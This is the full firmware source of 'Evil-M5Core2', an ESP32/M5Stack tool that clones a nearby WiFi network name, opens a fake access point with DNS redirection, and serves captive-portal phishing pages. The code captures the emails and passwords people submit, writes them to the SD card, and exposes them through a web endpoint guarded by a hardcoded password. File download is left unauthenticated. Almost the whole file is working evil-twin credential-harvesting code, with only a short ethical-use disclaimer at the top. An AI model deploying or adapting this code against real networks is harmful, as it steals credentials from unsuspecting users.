/*
   Evil-M5Core2 - WiFi Network Testing and Exploration Tool

   Copyright (c) [year] 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only. 
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2 
   assumes no liability and is not responsible for any misuse or damage caused by this tool. 
   Users are required to comply with all applicable laws and regulations in their jurisdiction 
   regarding network testing and ethical hacking.
*/

#include <M5Unified.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
extern "C" {
  #include "esp_wifi.h"
  #include "esp_system.h"
}

static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;
const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials", "Monitor Status" };
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
String ssidList[100];
int numSsid = 0;
bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "";  
int topVisibleIndex = 0; 

// Connect to wifi network automaticaly  
const char* ssid = ""; // ssid to connect 
const char* password = ""; // wifi password


 //password for web access to remote check captured credentials and send new html file
const char* accessWebPassword = "7h30th3r0n3";

String portalFiles[30]; // 30 portals max 
int numPortalFiles = 0;
String selectedPortalFile = "/sites/normal.html"; // defaut portal
int portalFileIndex = 0; 


int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;
bool isCaptivePortalOn = false;


String macAddresses[10]; // 10 mac address max
int numConnectedMACs = 0; 

File fsUploadFile; // global variable for file upload



void setup() {
  M5.begin();

  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setTextFont(1);

  const char* startUpMessages[] = {
    "  There is no spoon...",
    "    Hack the Planet!",
    " Accessing Mainframe...",
    "   Cracking Codes...",
    "Decrypting Messages...",
    "Infiltrating the Network.",
    " Bypassing Firewalls...",
    "Exploring the Deep Web...",
    "Launching Cyber Attack...",
    " Running Stealth Mode...",
    "   Gathering Intel...",
    "     Shara Conord?",
    " Breaking Encryption...",
    "Anonymous Mode Activated.",
    " Cyber Breach Detected.",
    "Initiating Protocol 47...",
    " The Gibson is in Sight.",
    "  Running the Matrix...",
    "Neural Networks Syncing...",
    "Quantum Algorithm started",
    "Digital Footprint Erased.",
    "   Uploading Virus...",
    "Downloading Internet...",
    "  Root Access Granted.",
    "Cyberpunk Mode: Engaged.",
    "  Zero Days Exploited.",
    "Retro Hacking Activated.",
    " Firewall: Deactivated.",
    "Riding the Light Cycle...",
    "  Engaging Warp Drive...",
    "  Hacking the Holodeck..",
    "  Tracing the Nexus-6...",
    "Charging at 2,21 GigaWatt",
    "  Loading Batcomputer...",
    "  Accessing StarkNet...",
    "  Dialing on Stargate...",
    "   Activating Skynet...",
    " Unleashing the Kraken.."
    " Accessing Mainframe...",
    "  Booting HAL 9000...",
    " Death Star loading ...",
    " Initiating Tesseract...",
    "  Decrypting Voynich...",
    "Charging at 2,21 GigaWatt",
    "   Hacking the Gibson...",
    "   Orbiting Planet X...",
    "  Accessing SHIELD DB...",
    " Crossing Event Horizon.",
    " Dive in the RabbitHole.",
    "   Rigging the Tardis...",
    " Sneaking into Mordor...",
    "Manipulating the Force...",
    "Decrypting the Enigma...",
    "Jacking into Cybertron.",
    "Casting a Shadowrun...",
    "Navigating the Grid...",
    "Surfing the Dark Web...",
    "Engaging Hyperdrive...",
    "Overclocking the AI...",
    "   Bending Reality...",
    "Scanning the Horizon...",
    "Decrypting the Code...",
    "Solving the Labyrinth...",
    "Escaping the Matrix...",
  };
  const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);

  randomSeed(esp_random());

  int randomIndex = random(numMessages);
  const char* randomMessage = startUpMessages[randomIndex];


  int textY = 80;
  int lineOffset = 10;
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30; 

  M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
  M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);

  M5.Display.setCursor(85, textY);
  M5.Display.println(" Evil-M5Core2");
  Serial.println("---------------------");  
  Serial.println(" Evil-M5Core2");
  M5.Display.setCursor(80, textY + 20);
  M5.Display.println("By 7h30th3r0n3");
  Serial.println("By 7h30th3r0n3");
  Serial.println("---------------------"); 
  M5.Display.setCursor(10, textY + 120);
  M5.Display.println(randomMessage);
  Serial.println(" ");
  Serial.println(randomMessage);
  Serial.println("---------------------"); 
  firstScanWifiNetworks();
  if (strcmp(ssid, "") != 0) {
        WiFi.mode(WIFI_MODE_APSTA);
        WiFi.begin(ssid, password);

        unsigned long startAttemptTime = millis();

        while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
            delay(500);
            Serial.println("Trying to connect to Wifi...");
        }

        if (WiFi.status() == WL_CONNECTED) {
            Serial.println("Connected to wifi !!!");
        } else {
            Serial.println("Fail to connect to Wifi or timeout...");
        }
    } else {
        Serial.println("SSID is empty, skipping Wi-Fi connection.");
    }
  
  if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
    Serial.println("Error.. SD card not mounted...");
    return;
  }
  Serial.println("SD card initialized !! ");


xTaskCreate(
        backgroundTask, 
        "BackgroundTask", 
        4096, /*stack*/
        NULL, 
        1, 
        NULL);
        
}

void backgroundTask(void *pvParameters) {
    for (;;) {
        dnsServer.processNextRequest();
        server.handleClient();
        vTaskDelay(10); 
    }
}

void firstScanWifiNetworks() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    unsigned long startTime = millis();
    int n;
    while (millis() - startTime < 2000) {
        n = WiFi.scanNetworks();
        if (n != WIFI_SCAN_RUNNING) break;
    }

    if (n == 0) {
        Serial.println("No network found ...");
    } else {
        Serial.print(n);
        Serial.println(" Near Wifi Networks : ");
        Serial.println("-------------------------");
        numSsid = min(n, 100);
        for (int i = 0; i < numSsid; i++) {
            ssidList[i] = WiFi.SSID(i);
            Serial.println(ssidList[i]);
        }
        Serial.println("-------------------------");
    }
}

void loop() {
  M5.update();

  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    if (M5.BtnB.wasPressed()) {
      inMenu = true;
      isOperationInProgress = false;
    }
  }
  //dnsServer.processNextRequest();
  //server.handleClient();
}

void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
    case 0:
      scanWifiNetworks();
      break;
    case 1:
      showWifiList();
      break;
    case 2:
      showWifiDetails(currentListIndex); 
      break;
    case 3:
      createCaptivePortal();
      break;
    case 4:
      stopCaptivePortal();
      break;
    case 5:
      changePortal();
      break;
    case 6:
      checkCredentials();
      break;
    case 7:
      deleteCredentials();
      break;
    case 8: 
      displayMonitorPage1();
      break;
  }
  isOperationInProgress = false;
}


void handleMenuInput() {
  if (M5.BtnA.wasPressed()) {
    currentIndex--;
    if (currentIndex < 0) {
      currentIndex = menuSize - 1; 
    }
  } else if (M5.BtnC.wasPressed()) {
    currentIndex++;
    if (currentIndex >= menuSize) {
      currentIndex = 0;  
    }
  } else if (M5.BtnB.wasPressed()) {
    executeMenuItem(currentIndex);
  }
}

void drawMenu() {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextFont(1);

    int lineHeight = 24; 
    int startX = 10;
    int startY = 25;

    for (int i = 0; i < menuSize; i++) {
        if (i == currentIndex) {
            M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
        M5.Display.println(menuItems[i]);
    }
    M5.Display.display();
}


void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
    M5.Display.setCursor(50 , M5.Display.height()/ 2 );
    M5.Display.print("Scan in progress... ");
    M5.Display.display();
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  numSsid = min(n, 100);
  for (int i = 0; i < numSsid; i++) {
    ssidList[i] = WiFi.SSID(i);
  }
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.begin(ssid, password);
  waitAndReturnToMenu("Scan Completed");
}


void showWifiList() {
  const int listDisplayLimit = M5.Display.height() / 18; 
  int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
  
  M5.Display.clear();
  M5.Display.setTextSize(2);
  for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
    if (i == currentListIndex) {
      M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(10, 25 + (i - listStartIndex) * 18);
    M5.Display.println(ssidList[i]);
  }
  M5.Display.display();

while (!inMenu) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      currentListIndex--;
      if (currentListIndex < 0) {
        currentListIndex = numSsid - 1; 
      }
      showWifiList();
    } else if (M5.BtnC.wasPressed()) {
      currentListIndex++;
      if (currentListIndex >= numSsid) {
        currentListIndex = 0; 
      }
      showWifiList(); 
    } else if (M5.BtnB.wasPressed()) {
      inMenu = true;
      waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
    }
  }
}

void showWifiDetails(int networkIndex) {
  if (networkIndex >= 0 && networkIndex < numSsid) {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    int y = 10; 

    M5.Display.setCursor(10, y);
    M5.Display.println("SSID: " + ssidList[networkIndex]);
    y += 40;
    
    M5.Display.setCursor(10, y);
    M5.Display.println("Channel: " + String(WiFi.channel(networkIndex)));
    y += 20;
    
    M5.Display.setCursor(10, y);
    String security = getWifiSecurity(networkIndex);
    M5.Display.println("Security: " + security);
    y += 20;

    M5.Display.setCursor(10, y);
    int32_t rssi = WiFi.RSSI(networkIndex);
    M5.Display.println("Signal: " + String(rssi) + " dBm");
    y += 20;

    M5.Display.setCursor(10, y);
    uint8_t* bssid = WiFi.BSSID(networkIndex);
    String macAddress = bssidToString(bssid);
    M5.Display.println("MAC: " + macAddress);
    y += 20;
    
    M5.Display.setCursor(230, 220);
    M5.Display.println("Clone");
    M5.Display.setCursor(140, 220);
    M5.Display.println("Back");
    
    M5.Display.display();

    while (!inMenu) {
      M5.update();
      if (M5.BtnC.wasPressed()) {
        cloneSSIDForCaptivePortal(ssidList[networkIndex]);
        inMenu = true;
        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
        drawMenu(); 
      } else if (M5.BtnB.wasPressed()) {
        inMenu = true;
        drawMenu(); 

      }
    }
  }
}

String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

void createCaptivePortal() {
    String ssid = clonedSSID.isEmpty() ? "FreeWifi" : clonedSSID;
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP(clonedSSID.c_str());
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    isCaptivePortalOn = true;

    server.on("/", HTTP_GET, []() {
        String email = server.arg("email");
        String password = server.arg("password");
        if (!email.isEmpty() && !password.isEmpty()) {
            saveCredentials(email, password);
            server.send(200, "text/plain", "Credentials Saved");
        } else {
            servePortalFile(selectedPortalFile);
        }
    });
    
    server.on("/credentials", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password == accessWebPassword) {
        File file = SD.open("/credentials.txt");
        if (file) {
            if (file.size() == 0) {
                server.send(200, "text/plain", "No credentials...");
            } else {
                server.streamFile(file, "text/plain");
            }
            file.close();
        } else {
            server.send(404, "text/plain", "File not found");
        }
    } else {
        server.send(403, "text/plain", "Unauthorized");
    }
});

    
    server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
    server.on("/download-sd-file", HTTP_GET, handleFileDownload);
    
      server.on("/uploadhtmlfile", HTTP_GET, []() {
      if (server.arg("pass") == accessWebPassword) {
        String html = "<form method='post' enctype='multipart/form-data' action='/upload'>";
        html += "<input type='file' name='file' accept='*/*'><br>";
        html += "<input type='submit' value='Upload'></form>";
        server.send(200, "text/html", html);
      } else {
        server.send(403, "text/plain", "Unauthorized");
      }
    });
    
    server.on("/upload", HTTP_POST, []() {
      server.send(200);
    }, handleFileUpload);

    server.on("/delete-sd-file", HTTP_GET, handleFileDelete);



    server.onNotFound([]() {
        servePortalFile(selectedPortalFile);
    });

    server.begin();
    waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
}


String getDirectoryHtml(File dir, String path, String password) {
    String html = "<ul>";
    if (path != "/") {
        String parentPath = path.substring(0, path.lastIndexOf('/'));
        if (parentPath == "") parentPath = "/";
        html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
    }
    
    while (File file = dir.openNextFile()) {
        String fileName = String(file.name());
        String displayFileName = fileName;
        if (path != "/" && fileName.startsWith(path)) {
            displayFileName = fileName.substring(path.length());
            if (displayFileName.startsWith("/")) {
                displayFileName = displayFileName.substring(1);
            }
        }

        String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
        if (!fullPath.startsWith("/")) {
            fullPath = "/" + fullPath;
        }

        if (file.isDirectory()) {
            html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
        } else {
            html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes) <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
        }
        file.close();
    }
    html += "</ul>";

    html += "<script>"
            "function confirmDelete(filename) {"
            "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
            "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
            "  }"
            "}"
            "</script>";

    return html;
}


void handleSdCardBrowse() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/plain", "Unauthorized");
        return;
    }

    String dirPath = server.arg("dir");
    if (dirPath == "") dirPath = "/";

    File dir = SD.open(dirPath);
    if (!dir || !dir.isDirectory()) {
        server.send(404, "text/plain", "Directory not found");
        return;
    }

    String html = getDirectoryHtml(dir, dirPath, accessWebPassword);
    server.send(200, "text/html", html);
    dir.close();
}

void handleFileDownload() {
    String fileName = server.arg("filename");
    if (!fileName.startsWith("/")) {
        fileName = "/" + fileName;
    }
    if (SD.exists(fileName)) {
        File file = SD.open(fileName, FILE_READ);
        if (file) {
            String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
            server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
            server.streamFile(file, "application/octet-stream");
            file.close();
            return;
        }
    }
    server.send(404, "text/plain", "File not found");
}

void handleFileUpload() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
        String filename = upload.filename;
        filename.replace("/", "");
        filename.replace("\\", "");
        if (!filename.startsWith("/sites/")) filename = "/sites/" + filename;


        fsUploadFile = SD.open(filename, FILE_WRITE);
        Serial.print("Upload Start: ");
        Serial.println(filename);
    } else if (upload.status == UPLOAD_FILE_WRITE) {
        if (fsUploadFile) {
            fsUploadFile.write(upload.buf, upload.currentSize);
        }
    } else if (upload.status == UPLOAD_FILE_END) {
        if (fsUploadFile) {
            fsUploadFile.close();
            Serial.print("Upload End: ");
            Serial.println(upload.totalSize);
            server.send(200, "text/plain", "File Uploaded Successfully");
        } else {
            server.send(500, "text/plain", "500: couldn't create file");
        }
    }
}


void handleFileDelete() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/plain", "Unauthorized");
        return;
    }

    String fileName = server.arg("filename");
    if (!fileName.startsWith("/")) {
        fileName = "/" + fileName;
    }
    if (SD.exists(fileName)) {
        if (SD.remove(fileName)) {
            server.send(200, "text/plain", "File deleted successfully");
        } else {
            server.send(500, "text/plain", "File could not be deleted");
        }
    } else {
        server.send(404, "text/plain", "File not found");
    }
}

void servePortalFile(const String& filename) {
    File webFile = SD.open(filename);
    if (webFile) {
        server.streamFile(webFile, "text/html");
        webFile.close();
    } else {
        server.send(404, "text/plain", "File not found");
    }
}

void saveCredentials(const String& email, const String& password) {
    File file = SD.open("/credentials.txt", FILE_APPEND);
    if (file) {
        file.println("Email:" + email);
        file.println("Password:" + password);
        file.println("----------------------");
        file.close();
        Serial.println("Credentials " + email + ":" + password + " saved");
    } else {
        Serial.println("Error opening file for writing");
    }
}
void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  waitAndReturnToMenu("  Portal Stopped");
}

void listPortalFiles() {
    File root = SD.open("/sites");
    numPortalFiles = 0;
    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            String fileName = file.name();
            if (fileName.endsWith(".html")) {
                portalFiles[numPortalFiles++] = String("/sites/") + fileName;
                if (numPortalFiles >= 30) break;
            }
        }
        file.close();
    }
    root.close();
}


void changePortal() {
    listPortalFiles();
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(10, 10);
    M5.Display.println("Select Portal:");

    int displayLimit = min(numPortalFiles, 10);
    
    for (int i = 0; i < displayLimit; i++) {
        int displayIndex = (topVisibleIndex + i) % numPortalFiles;
        M5.Display.setCursor(10, 30 + i * 20);
        if (displayIndex == portalFileIndex) {
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.println(portalFiles[displayIndex].substring(7));
    }
    M5.Display.display();

    while (!inMenu) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
            topVisibleIndex = (topVisibleIndex - 1 + numPortalFiles) % numPortalFiles;
            changePortal();
        } else if (M5.BtnC.wasPressed()) {
            portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
            topVisibleIndex = (topVisibleIndex + 1) % numPortalFiles;
            changePortal();
        } else if (M5.BtnB.wasPressed()) {
            selectedPortalFile = portalFiles[portalFileIndex];
            inMenu = true;
            waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected"); 
        }
    }
}

String credentialsList[100]; // max 100 lignes parsed
int numCredentials = 0; 

void readCredentialsFromFile() {
    File file = SD.open("/credentials.txt");
    if (file) {
        numCredentials = 0;
        while (file.available() && numCredentials < 100) {
            credentialsList[numCredentials++] = file.readStringUntil('\n');
        }
        file.close();
    } else {
        Serial.println("Error opening file");
    }
}

void checkCredentials() {
    readCredentialsFromFile();
    if (numCredentials == 0) {
        waitAndReturnToMenu(" No credentials...");
    } else {
        const int lineHeight = 18; 
        const int maxLineLength = M5.Display.width() / 13; 
        const int listDisplayLimit = M5.Display.height() / lineHeight - 2;

        int totalLines = 0;
        int listStartIndex = 0;
        for (int i = 0; i < numCredentials; i++) {
            int linesNeeded = (credentialsList[i].length() + maxLineLength - 1) / maxLineLength;
            if (i < currentListIndex) {
                listStartIndex += linesNeeded;
            }
            totalLines += linesNeeded;
        }

        int listEndIndex = min(totalLines, listStartIndex + listDisplayLimit);
        M5.Display.clear();
        M5.Display.setTextSize(2);

        int displayY = 25;
        int currentLine = 0;
        for (int i = 0; i < numCredentials; i++) {
            String credential = credentialsList[i];
            int credentialLength = credential.length();
            int linesNeeded = (credentialLength + maxLineLength - 1) / maxLineLength;

            for (int line = 0; line < linesNeeded; line++) {
                if (currentLine >= listStartIndex && currentLine < listEndIndex) {
                    int startIndex = line * maxLineLength;
                    int endIndex = min(startIndex + maxLineLength, credentialLength);
                    String part = credential.substring(startIndex, endIndex);

                    if (i == currentListIndex) {
                        M5.Display.fillRect(0, displayY, M5.Display.width(), lineHeight, TFT_NAVY);
                        M5.Display.setTextColor(TFT_GREEN);
                    } else {
                        M5.Display.setTextColor(TFT_WHITE);
                    }

                    M5.Display.setCursor(10, displayY);
                    M5.Display.println(part);
                    displayY += lineHeight;
                }
                currentLine++;
            }
            if (currentLine >= listEndIndex) break;
        }
        M5.Display.display();

        while (!inMenu) {
            M5.update();
            if (M5.BtnA.wasPressed()) {
                currentListIndex = max(0, currentListIndex - 1);
                checkCredentials();
            } else if (M5.BtnC.wasPressed()) {
                currentListIndex = min(numCredentials - 1, currentListIndex + 1);
                checkCredentials();
            } else if (M5.BtnB.wasPressed()) {
                inMenu = true;
                drawMenu(); 
            }
        }
    }
}

bool confirmDeletePopup() {
  bool confirm = false;
  bool decisionMade = false;
  
  M5.Display.clear();
  M5.Display.setCursor(50, M5.Display.height()/2);
  M5.Display.println("Delete credentials?");
  M5.Display.setCursor(37, 220);
  M5.Display.println("Yes");
  M5.Display.setCursor(254, 220);
  M5.Display.println("No");

  while (!decisionMade) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      confirm = true;
      decisionMade = true;
    }
    if (M5.BtnC.wasPressed()) {
      confirm = false;
      decisionMade = true;
    }
  }

  return confirm;
}

void deleteCredentials() {
    if (confirmDeletePopup()) {
        File file = SD.open("/credentials.txt", FILE_WRITE);
        if (file) {
            file.close();
            waitAndReturnToMenu("Deleted successfully");
            Serial.println("Credentials deleted successfully");
        } else {
            waitAndReturnToMenu("Error..");
            Serial.println("Error opening file for deletion");
        }
    } else {
        waitAndReturnToMenu("Deletion cancelled");
    }
}


int countPasswordsInFile() {
    File file = SD.open("/credentials.txt");
    if (!file) {
        Serial.println("Error opening credentials file for reading");
        return 0;
    }

    int passwordCount = 0;
    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.startsWith("Password:")) {
            passwordCount++;
        }
    }

    file.close();
    return passwordCount;
}

void displayMonitorPage1() {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(10, 30);
    M5.Display.println("Clients : " + String(WiFi.softAPgetStationNum()));
    M5.Display.setCursor(10, 60);
    M5.Display.println("Passwords: " + String(countPasswordsInFile()));
    M5.Display.setCursor(10, 90);
    M5.Display.println("Cloned: " + clonedSSID);
    M5.Display.setCursor(10, 120);
    M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
    M5.Display.setCursor(10, 150);
    M5.Display.println("Page: " + selectedPortalFile.substring(7));
    M5.Display.display();

    while (!inMenu) {
        M5.update();

        if (M5.BtnA.wasPressed()) {
            displayMonitorPage3();
            break;
        } else if (M5.BtnC.wasPressed()) {
            displayMonitorPage2();
            break;
        } else if (M5.BtnB.wasPressed()) {
            inMenu = true; 
            drawMenu();
            break;
        }
    }
}

void updateConnectedMACs() {
    wifi_sta_list_t stationList;
    tcpip_adapter_sta_list_t adapterList;
    esp_wifi_ap_get_sta_list(&stationList);
    tcpip_adapter_get_sta_list(&stationList, &adapterList);

    for (int i = 0; i < adapterList.num; i++) {
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
                 adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
        macAddresses[i] = String(macStr);
    }
}

void displayMonitorPage2() {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    updateConnectedMACs();
    if (macAddresses[0] == "") { 
        M5.Display.setCursor(10, 30);
        M5.Display.println("No client connected");
    } else {
    for (int i = 0; i < 10; i++) {
        int y = 30 + i * 20; 
        if (y > M5.Display.height() - 20) break; 

        M5.Display.setCursor(10, y);
        M5.Display.println(macAddresses[i]);
    }}

    M5.Display.display();

    while (!inMenu) {
        M5.update();

        if (M5.BtnA.wasPressed()) {
            displayMonitorPage1(); 
            break;
        } else if (M5.BtnC.wasPressed()) {
            displayMonitorPage3(); 
            break;
        } else if (M5.BtnB.wasPressed()) {
            inMenu = true; 
            drawMenu();
            break;
        }
    }
    }

void displayMonitorPage3() {
    M5.Display.clear();
    M5.Display.setTextSize(2);

    M5.Display.setCursor(10, 30);
    M5.Display.println("CPU: " + String(getCpuUsage()) + "%");

    M5.Display.setCursor(10, 60);
    M5.Display.println("RAM: " + String(getRamUsage()) + " Mo");

    M5.Display.setCursor(10, 90);
    M5.Display.println("Batterie: " + String(getBatteryLevel()) + "%");

    M5.Display.setCursor(10, 120);
    M5.Display.println("Temperature: " + String(getTemperature()) + " C");

    M5.Display.display();

    while (!inMenu) {
        M5.update();

        if (M5.BtnA.wasPressed()) {
            displayMonitorPage2();
            break;
        } else if (M5.BtnC.wasPressed()) {
            displayMonitorPage1(); 
            break;
        } else if (M5.BtnB.wasPressed()) {
            inMenu = true; 
            drawMenu();
            break;
        }
    }
}

String getBatteryLevel() {
    return String(M5.Power.getBatteryLevel());
}

String getTemperature() {
    float temperature;
    M5.Imu.getTemp(&temperature);
    return String(temperature);
}
String getCpuUsage() {
    
        // todo
    return "N/A";
}

String getRamUsage() {
    float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0; 
    char buffer[10]; 
    sprintf(buffer, "%.2f", heapSizeInMegabytes);
    return String(buffer);
}


void waitAndReturnToMenu(String message) {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
  M5.Display.setCursor(50 , M5.Display.height()/ 2 );
  M5.Display.println(message);
  M5.Display.display();
  delay(1000);
  inMenu = true;
  drawMenu();  
}
